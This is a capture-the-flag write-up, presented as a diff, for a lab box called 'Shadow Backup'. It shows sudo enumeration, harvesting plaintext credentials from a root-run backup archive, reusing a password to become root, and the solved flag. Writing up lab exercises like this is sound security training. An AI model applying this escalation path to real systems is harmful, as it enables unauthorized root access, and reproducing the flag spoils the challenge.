@@ -1,0 +1,138 @@
+Shadow Backup — Privilege Escalation Write-Up
+Challenge Information
+
+Name: Shadow Backup
+
+Author: Astra
+
+OS: Debian 13
+
+Difficulty: Medium
+
+Goal: Gain root access and retrieve the flag
+
+Objective
+
+Obtain full root privileges on the target system and extract the flag from the /root directory.
+
+Initial Access
+Provided Credentials
+Username: devops
+Password: Devops@2024
+
+
+Login was performed using the VirtualBox console.
+
+Enumeration
+Checking Sudo Privileges
+sudo -l
+
+
+Output:
+
+(root) NOPASSWD: /opt/internal/backup.sh
+
+
+This shows that the devops user can execute backup.sh as root without authentication.
+
+Analyzing the Backup Script
+Viewing Script Content
+cat /opt/internal/backup.sh
+
+
+Output:
+
+#!/bin/bash
+tar -czf /tmp/backup.tar.gz /var/www/html
+
+
+The script creates a compressed archive of the web directory with root privileges.
+
+Vulnerability Identification
+
+The backup script:
+
+Runs with root privileges
+
+Archives sensitive web files
+
+Stores output in a globally accessible location
+
+Does not restrict access to the backup file
+
+This results in sensitive information exposure.
+
+Creating the Backup
+
+Execute the script:
+
+sudo /opt/internal/backup.sh
+
+
+Verify creation:
+
+ls /tmp/backup.tar.gz
+
+Extracting the Backup
+mkdir /tmp/loot
+tar -xvf /tmp/backup.tar.gz -C /tmp/loot
+
+Credential Discovery
+
+Navigate to the extracted files:
+
+cat /tmp/loot/var/www/html/portal/config.php
+
+
+Output:
+
+$db_user = "devops";
+$db_pass = "Devops@2024";
+
+
+The credentials were stored in plaintext.
+
+Security Weakness
+
+Sensitive credentials stored in web configuration files
+
+Backup exposes internal application files
+
+Password reuse between application and system accounts
+
+This allows privilege escalation.
+
+Privilege Escalation
+
+Attempt root login using leaked credentials:
+
+su root
+
+
+Password:
+
+Devops@2024
+
+
+Access was successfully obtained.
+
+Retrieving the Flag
+
+Locate files in /root:
+
+find /root -type f
+
+
+Flag location:
+
+/root/flag/root.txt
+
+
+Read flag:
+
+cat /root/flag/root.txt
+
+
+Flag:
+
+SECE{sudo_secure_path_is_not_your_friend}
